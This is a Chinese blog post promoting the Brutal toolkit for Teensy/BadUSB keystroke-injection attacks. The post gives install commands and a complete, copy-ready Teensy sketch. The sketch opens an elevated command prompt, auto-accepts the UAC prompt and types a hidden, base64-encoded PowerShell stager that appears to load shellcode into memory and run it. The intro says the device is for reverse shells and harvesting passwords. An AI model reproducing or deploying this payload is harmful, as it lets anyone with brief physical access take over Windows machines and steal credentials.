---
title: Brutal与Badusb使用更加懒人化
date: 2017-01-13 22:49:54
tags: Metasploit,kali
categories: Metasploit
---
<h1>                             <strong><span style="color: #ff0000;">Brutal/msf与Badusb结合使用更加懒人化/自动化</span></strong></h1>
----------------------------》<strong><span style="color: #ff0000;">无需编程要求，轻松快捷一键化。</span></strong>

&nbsp;

<img class="alignnone wp-image-3016" src="http://www.secist.com/wp-content/uploads/2017/01/a43d8358-a50f-11e6-90a6-c967a9d3a43f.png" alt="a43d8358-a50f-11e6-90a6-c967a9d3a43f" width="409" height="411" />
<!--more-->
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=26326198&auto=1&height=66"></iframe>

## <h1><strong><span style="color: #ff0000;">背景介绍：</span></strong></h1>
<span style="color: #008000;">Teensy</span>像橡皮鸭，t对于在目标机器上执行脚本非常有用，无需人机键盘交互（<span style="color: #008000;"><strong>HID-ATTACK</strong></span>）。当您插入设备时，它将被检测为键盘，并使用微处理器和板载闪存存储器，你可以发送一个非常快速的击键到目标的机器，并完全妥协，无论自动运行。我在我的安全测试中使用它来运行侦察或枚举脚本，执行反向shell，利用本地DLL劫持/特权升级漏洞，并获取所有密码。现在im开发新工具的名字是Brutal

Brutal是一个工具包，用于快速创建人机接口设备的<strong><span style="color: #008000;">各种有效负载，powershell攻击，病毒攻击和启动侦听器</span></strong>

&nbsp;

<img class="alignnone wp-image-3022" src="http://www.secist.com/wp-content/uploads/2017/01/13736-01.jpg" alt="13736-01" width="433" height="433" />

&nbsp;

&nbsp;

&nbsp;
<h1><strong><span style="color: #ff0000;"><span class="goog-text-highlight">Screenshoot</span></span></strong></h1>
<img class="alignnone wp-image-3020" src="http://www.secist.com/wp-content/uploads/2017/01/bc2d91ec-a50f-11e6-8a2a-eb9aa029e40b.png" alt="bc2d91ec-a50f-11e6-8a2a-eb9aa029e40b" width="467" height="526" /><img class="alignnone wp-image-3021" src="http://www.secist.com/wp-content/uploads/2017/01/bc2b6f2a-a50f-11e6-9b7f-414f23508819.png" alt="bc2b6f2a-a50f-11e6-9b7f-414f23508819" width="450" height="507" />

&nbsp;

&nbsp;
## 安装步骤
<h2><strong><span style="color: #ff0000;">相关kali上的安装步骤：</span></strong></h2>
<pre class="lang:vim decode:true">git clone https://github.com/Screetsec/Brutal.git
cd Brutal
chmod +x Brutal.sh
sudo ./Brutal.sh or sudo su ./Brutal.sh</pre>
<h2> 官方给出的视频演示地址;https://www.youtube.com/watch?v=WaqY-pQpuV0</h2>
## 相关代码本人演示代码地址：

<strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong>

<strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong>

<strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong>

<strong><span style="color: #ff0000;">代码可直接复制！！！！</span></strong>

&nbsp;

<link rel="stylesheet" type="text/css" href="http://demonsec666.oss-cn-qingdao.aliyuncs.com/asciinema-player.css" />

  <asciinema-player src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/Brutal.json" cols="100" rows="30"></asciinema-player>
  ...
  <script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/asciinema-player.js"></script>

<img class="alignnone wp-image-3023" src="http://www.secist.com/wp-content/uploads/2017/01/5F3811D6-94F1-4EA6-9955-906A991691DF.jpg" alt="5f3811d6-94f1-4ea6-9955-906a991691df" width="622" height="395" />

&nbsp;
## 要求
<h2><span style="color: #ff0000;"><strong>要求</strong></span></h2>
<ul>
 	<li>Arduino软件（我使用的是v1.6.7）</li>
 	<li>TeensyDuino</li>
 	<li>Linux udev规则</li>
 	<li>如何安装所有要求？<a href="https://github.com/Screetsec/Brutal/wiki/Install-Requirements">访问此Wiki</a></li>
</ul>
## 硬件支持
<h2><a id="user-content-supported-hardware" class="anchor" href="https://github.com/Screetsec/Brutal#supported-hardware"></a><strong><span style="color: #ff0000;">支持的硬件</span></strong></h2>
以下硬件已经过测试并且已知可以工作。
<ul>
 	<li>Teensy 3.x</li>
 	<li>USB电缆</li>
</ul>
<h2></h2>
<h2><strong><span style="color: #ff0000;">主要我这边没有购买Teensy，所以无法清晰的视频演示 。将就的看看生成ino 文件生成的过程吧 ---Teensy价格在一百左右-------值得考虑，然而黄鸭某平台买的是880元，然并软，对我们种穷屌丝相对来说 Teensy可靠些来说 Teensy可靠些</span></strong></h2>
<pre class="lang:vim decode:true ">/*
Script Edit By : Edo Maland  [ Screetsec ]
Follow me on : www,github.com/Screetsec
Penetration OS from Indonesia : Dracos Linux
Link : www.dracos-linux.org
Forum : forum.dracos-linux.org


## Code
*/


int ds = 500;

#if defined(CORE_TEENSY)
#define LED_PIN 13
#endif

void setup()
{

  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);
  // turn the LED on while running
  digitalWrite(LED_PIN, HIGH);


  delay(3000);
  show_desktop();

  delay(3000);
  cmd_admin();

  delay(3000);
  send_altyes();

  delay(1000);
  Keyboard.print("ipconfig");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("CD %TMP%");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();;

  delay(1000);
  Keyboard.print("powershell -window hidden -EncodedCommand JABPAFgANAAgAD0AIAAnACQAbgAzAGUAIAA9ACAAJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwAQQBsAGwAbwBjAGEAdABpAG8AbgBUAHkAcABlACwAIAB1AGkAbgB0ACAAZgBsAFAAcgBvAHQAZQBjAHQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzACwAIAB1AGkAbgB0ACAAZAB3AFMAdABhAGMAawBTAGkAegBlACwAIABJAG4AdABQAHQAcgAgAGwAcABTAHQAYQByAHQAQQBkAGQAcgBlAHMAcwAsACAASQBuAHQAUAB0AHIAIABsAHAAUABhAHIAYQBtAGUAdABlAHIALAAgAHUAaQBuAHQAIABkAHcAQwByAGUAYQB0AGkAbwBuAEYAbABhAGcAcwAsACAASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQASQBkACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBtAHMAdgBjAHIAdAAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAbQBlAG0AcwBlAHQAKABJAG4AdABQAHQAcgAgAGQAZQBzAHQALAAgAHUAaQBuAHQAIABzAHIAYwAsACAAdQBpAG4AdAAgAGMAbwB1AG4AdAApADsAJwAnADsAJAB3ACAAPQAgAEEAZABkAC0AVAB5AHAAZQAgAC0AbQBlAG0AYgBlAHIARABlAGYAaQBuAGkAdABpAG8AbgAgACQAbgAzAGUAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAegAgAD0AIAAwAHgAYgBhACwAMAB4ADIAMgAsADAAeABiAGEALAAwAHgAOABlACwAMAB4AGIANwAsADAAeABkADkALAAwAHgAYwAxACwAMAB4AGQAOQAsADAAeAA3ADQALAAwAHgAMgA0ACwAMAB4AGYANAAsADAAeAA1ADgALAAwAHgAMwAxACwAMAB4AGMAOQAsADAAeABiADEALAAwAHgANAA3ACwAMAB4ADMAMQAsADAAeAA1ADAALAAwAHgAMQAzACwAMAB4ADgAMwAsADAAeABlADgALAAwAHgAZgBjACwAMAB4ADAAMwAsADAAeAA1ADAALAAwAHgAMgBkACwAMAB4ADUAOAAsADAAeAA3AGIALAAwAHgANABiACwAMAB4AGQAOQAsADAAeAAxAGUALAAwAHgAOAA0ACwAMAB4AGIANAAsADAAeAAxADkALAAwAHgANwBmACwAMAB4ADAAYwAsADAAeAA1ADEALAAwAHgAMgA4ACwAMAB4AGIAZgAsADAAeAA2AGEALAAwAHgAMQAxACwAMAB4ADEAYQAsADAAeAAwAGYALAAwAHgAZgA4ACwAMAB4ADcANwAsADAAeAA5ADYALAAwAHgAZQA0ACwAMAB4AGEAYwAsADAAeAA2ADMALAAwAHgAMgBkACwAMAB4ADgAOAAsADAAeAA3ADgALAAwAHgAOAAzACwAMAB4ADgANgAsADAAeAAyADcALAAwAHgANQBmACwAMAB4AGEAYQAsADAAeAAxADcALAAwAHgAMQBiACwAMAB4AGEAMwAsADAAeABhAGQALAAwAHgAOQBiACwAMAB4ADYANgAsADAAeABmADAALAAwAHgAMABkACwAMAB4AGEAMgAsADAAeABhADgALAAwAHgAMAA1ACwAMAB4ADQAZgAsADAAeABlADMALAAwAHgAZAA1ACwAMAB4AGUANAAsADAAeAAxAGQALAAwAHgAYgBjACwAMAB4ADkAMgAsADAAeAA1AGIALAAwAHgAYgAyACwAMAB4AGMAOQAsADAAeABlAGYALAAwAHgANgA3ACwAMAB4ADMAOQAsADAAeAA4ADEALAAwAHgAZgBlACwAMAB4AGUAZgAsADAAeABkAGUALAAwAHgANQAxACwAMAB4ADAAMAAsADAAeABjADEALAAwAHgANwAwACwAMAB4AGUAYQAsADAAeAA1AGIALAAwAHgAYwAxACwAMAB4ADcAMwAsADAAeAAzAGYALAAwAHgAZAAwACwAMAB4ADQAOAAsADAAeAA2AGMALAAwAHgANQBjACwAMAB4AGQAZAAsADAAeAAwADMALAAwAHgAMAA3ACwAMAB4ADkANgAsADAAeABhADkALAAwAHgAOQA1ACwAMAB4AGMAMQAsADAAeABlADcALAAwAHgANQAyACwAMAB4ADMAOQAsADAAeAAyAGMALAAwAHgAYwA4ACwAMAB4AGEAMAAsADAAeAA0ADMALAAwAHgANgA4ACwAMAB4AGUAZQAsADAAeAA1AGEALAAwAHgAMwA2ACwAMAB4ADgAMAAsADAAeAAwAGQALAAwAHgAZQA2ACwAMAB4ADQAMQAsADAAeAA1ADcALAAwAHgANgBjACwAMAB4ADMAYwAsADAAeABjADcALAAwAHgANABjACwAMAB4AGQANgAsADAAeABiADcALAAwAHgANwBmACwAMAB4AGEAOQAsADAAeABlADcALAAwAHgAMQA0ACwAMAB4ADEAOQAsADAAeAAzAGEALAAwAHgAZQBiACwAMAB4AGQAMQAsADAAeAA2AGQALAAwAHgANgA0ACwAMAB4AGUAZgAsADAAeABlADQALAAwAHgAYQAyACwAMAB4ADEAZQAsADAAeAAwAGIALAAwAHgANgBjACwAMAB4ADQANQAsADAAeABmADEALAAwAHgAOQBhACwAMAB4ADMANgAsADAAeAA2ADIALAAwAHgAZAA1ACwAMAB4AGMANwAsADAAeABlAGQALAAwAHgAMABiACwAMAB4ADQAYwAsADAAeABhAGQALAAwAHgANAAwACwAMAB4ADMAMwAsADAAeAA4AGUALAAwAHgAMABlACwAMAB4ADMAYwAsADAAeAA5ADEALAAwAHgAYwA0ACwAMAB4AGEAMgAsADAAeAAyADkALAAwAHgAYQA4ACwAMAB4ADgANgAsADAAeABhAGEALAAwAHgAOQBlACwAMAB4ADgAMQAsADAAeAAzADgALAAwAHgAMgBhACwAMAB4ADgAOQAsADAAeAA5ADIALAAwAHgANABiACwAMAB4ADEAOAAsADAAeAAxADYALAAwAHgAMAA5ACwAMAB4AGMANAAsADAAeAAxADAALAAwAHgAZABmACwAMAB4ADkANwAsADAAeAAxADMALAAwAHgANQA3ACwAMAB4AGMAYQAsADAAeAA2ADAALAAwAHgAOABiACwAMAB4AGEANgAsADAAeABmADUALAAwAHgAOQAwACwAMAB4ADgANQAsADAAeAA2AGMALAAwAHgAYQAxACwAMAB4AGMAMAAsADAAeABiAGQALAAwAHgANAA1ACwAMAB4AGMAYQAsADAAeAA4AGEALAAwAHgAMwBkACwAMAB4ADYAYQAsADAAeAAxAGYALAAwAHgAMgA2ACwAMAB4ADMAYgAsADAAeABmAGMALAAwAHgANgAwACwAMAB4ADEAZgAsADAAeAA0ADIALAAwAHgANgA5ACwAMAB4ADAAOAAsADAAeAA2ADIALAAwAHgANAA1ACwAMAB4ADgAMAAsADAAeAA5ADUALAAwAHgAZQBiACwAMAB4AGEAMwAsADAAeABmADIALAAwAHgANwA1ACwAMAB4AGIAYwAsADAAeAA3AGIALAAwAHgAYgAyACwAMAB4ADIANQAsADAAeAA3AGMALAAwAHgAMgBjACwAMAB4ADUAYQAsADAAeAAyAGMALAAwAHgANwAzACwAMAB4ADEAMwAsADAAeAA3AGEALAAwAHgANABmACwAMAB4ADUAOQAsADAAeAAzAGMALAAwAHgAMQAwACwAMAB4AGEAMAAsADAAeAAzADQALAAwAHgAMQA0ACwAMAB4ADgAYwAsADAAeAA1ADkALAAwAHgAMQBkACwAMAB4AGUAZQAsADAAeAAyAGQALAAwAHgAYQA1ACwAMAB4ADgAYgAsADAAeAA4AGEALAAwAHgANgBkACwAMAB4ADIAZAAsADAAeAAzADgALAAwAHgANgBhACwAMAB4ADIAMwAsADAAeABjADYALAAwAHgAMwA1ACwAMAB4ADcAOAAsADAAeABkADMALAAwAHgAMgA2ACwAMAB4ADAAMAAsADAAeAAyADIALAAwAHgANwA1ACwAMAB4ADMAOAAsADAAeABiAGUALAAwAHgANAA5ACwAMAB4ADcAOQAsADAAeABhAGMALAAwAHgANAA1ACwAMAB4AGQAOAAsADAAeAAyAGUALAAwAHgANQA4ACwAMAB4ADQANAAsADAAeAAzAGQALAAwAHgAMQA4ACwAMAB4AGMANwAsADAAeABiADcALAAwAHgANgA4ACwAMAB4ADEAMwAsADAAeABjAGUALAAwAHgAMgBkACwAMAB4AGQAMwAsADAAeAA0AGIALAAwAHgAMgBmACwAMAB4AGEAMgAsADAAeABkADMALAAwAHgAOABiACwAMAB4ADcAOQAsADAAeABhADgALAAwAHgAZAAzACwAMAB4AGUAMwAsADAAeABkAGQALAAwAHgAOAA4ACwAMAB4ADgANwAsADAAeAAxADYALAAwAHgAMgAyACwAMAB4ADAANQAsADAAeABiADQALAAwAHgAOABiACwAMAB4AGIANwAsADAAeABhADYALAAwAHgAZQBkACwAMAB4ADcAOAAsADAAeAAxAGYALAAwAHgAYwBmACwAMAB4ADEAMwAsADAAeABhADcALAAwAHgANQA3ACwAMAB4ADUAMAAsADAAeABlAGIALAAwAHgAOAAyACwAMAB4ADYAOQAsADAAeABhAGMALAAwAHgAMwBhACwAMAB4AGUAYQAsADAAeAAxAGYALAAwAHgAZABjACwAMAB4AGYAZQA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACkAewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAUgBuAEoASgA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAGcALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHoALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAaQArACsAKQAgAHsAJAB3ADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAUgBuAEoASgAuAFQAbwBJAG4AdAAzADIAKAApACsAJABpACkALAAgACQAegBbACQAaQBdACwAIAAxACkAfQA7ACQAdwA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAAsACQAUgBuAEoASgAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwAnADsAJABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAE8AWAA0ACkAKQA7ACQAbgBuAEwAdQAgAD0AIAAiAC0AZQBuAGMAIAAiADsAaQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA4ACkAewAkAFcAcQBnADUAIAA9ACAAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAIAArACAAIgBcAHMAeQBzAHcAbwB3ADYANABcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsACIAOwBpAGUAeAAgACIAJgAgACQAVwBxAGcANQAgACQAbgBuAEwAdQAgACQAZQAiAH0AZQBsAHMAZQB7ADsAaQBlAHgAIAAiACYAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAJABuAG4ATAB1ACAAJABlACIAOwB9AA==");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

}

void loop(){
    // blink quickly when complete
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}


void show_desktop(){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_D);
  Keyboard.send_now();
  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void send_altyes(){
  delay(1000);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();
  delay(100);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }

void cmd_admin(){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  delay(1000);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(2000);
  Keyboard.print("cmd");

  delay(2000);
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(200);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}</pre>
<strong><span style="color: #339966;">最后值得说的是 无需编程要求-----更加自动化 -----懒人化----</span></strong>